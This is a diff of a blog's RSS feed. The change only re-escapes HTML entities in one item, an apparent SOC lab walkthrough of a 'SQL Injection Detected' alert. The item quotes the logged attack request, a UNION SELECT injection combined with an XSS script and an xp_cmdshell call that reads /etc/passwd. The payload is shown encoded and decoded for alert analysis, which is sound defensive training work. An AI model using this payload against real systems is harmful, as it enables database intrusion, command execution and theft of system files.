@@ -1,15 +1,15 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sqli on ittechnetworkk</title><link>https://ittechnetworkk.github.io/tags/sqli/</link><description>Recent content in Sqli on ittechnetworkk</description><generator>Hugo</generator><language>en-us</language><copyright>ittechnetworkk</copyright><lastBuildDate>Sat, 05 Jul 2025 15:16:47 +0200</lastBuildDate><atom:link href="https://ittechnetworkk.github.io/tags/sqli/index.xml" rel="self" type="application/rss+xml"/><item><title>SOC127 - SQL Injection Detected</title><link>https://ittechnetworkk.github.io/walkthroughs/soc127/</link><pubDate>Sat, 05 Jul 2025 15:16:47 +0200</pubDate><guid>https://ittechnetworkk.github.io/walkthroughs/soc127/</guid><description>&lt;p>EventID : 235
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sqli on ittechnetworkk</title><link>https://ittechnetworkk.github.io/tags/sqli/</link><description>Recent content in Sqli on ittechnetworkk</description><generator>Hugo</generator><language>en-us</language><copyright>ittechnetworkk</copyright><lastBuildDate>Sat, 05 Jul 2025 15:16:47 +0200</lastBuildDate><atom:link href="https://ittechnetworkk.github.io/tags/sqli/index.xml" rel="self" type="application/rss+xml"/><item><title>SOC127 - SQL Injection Detected</title><link>https://ittechnetworkk.github.io/walkthroughs/soc127/</link><pubDate>Sat, 05 Jul 2025 15:16:47 +0200</pubDate><guid>https://ittechnetworkk.github.io/walkthroughs/soc127/</guid><description>&lt;p&gt;EventID : 235
 Event Time : Mar, 07, 2024, 12:51 PM
 Rule : SOC127 - SQL Injection Detected
-Level : Security Analyst&lt;/p>
-&lt;p>Source Address : 118.194.247.28
+Level : Security Analyst&lt;/p&gt;
+&lt;p&gt;Source Address : 118.194.247.28
 Destination Address : 172.16.20.12
 Destination Hostname : WebServer1000
-Request URL : GET /?douj=3034%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1&amp;ndash;%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 200 865&lt;/p>
-&lt;p>Device Action : Allowed&lt;/p>
-&lt;p>&lt;strong>Request URL Decoding:&lt;/strong>&lt;/p>
-&lt;p>&lt;strong>Request:&lt;/strong>&lt;/p>
-&lt;p>GET /?douj=3034%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1&amp;ndash;%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 200 865&lt;/p>
-&lt;p>&lt;strong>Result:&lt;/strong>&lt;/p>
-&lt;pre tabindex="0">&lt;code>GET /?douj=3034 AND 1=1 UNION ALL SELECT 1,NULL,&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;XSS&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;,table_name FROM information_schema.tables WHERE 2&amp;gt;1--/**/; EXEC xp_cmdshell(&amp;#39;cat ../../../etc/passwd&amp;#39;)# HTTP/1.1 200 865 
-&lt;/code>&lt;/pre>&lt;p>&lt;strong>Threat Intel:&lt;/strong>&lt;/p></description></item></channel></rss>
+Request URL : GET /?douj=3034%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1&amp;ndash;%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 200 865&lt;/p&gt;
+&lt;p&gt;Device Action : Allowed&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Request URL Decoding:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Request:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;GET /?douj=3034%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1&amp;ndash;%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 200 865&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;GET /?douj=3034 AND 1=1 UNION ALL SELECT 1,NULL,&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;XSS&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;,table_name FROM information_schema.tables WHERE 2&amp;gt;1--/**/; EXEC xp_cmdshell(&amp;#39;cat ../../../etc/passwd&amp;#39;)# HTTP/1.1 200 865 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Threat Intel:&lt;/strong&gt;&lt;/p&gt;</description></item></channel></rss>
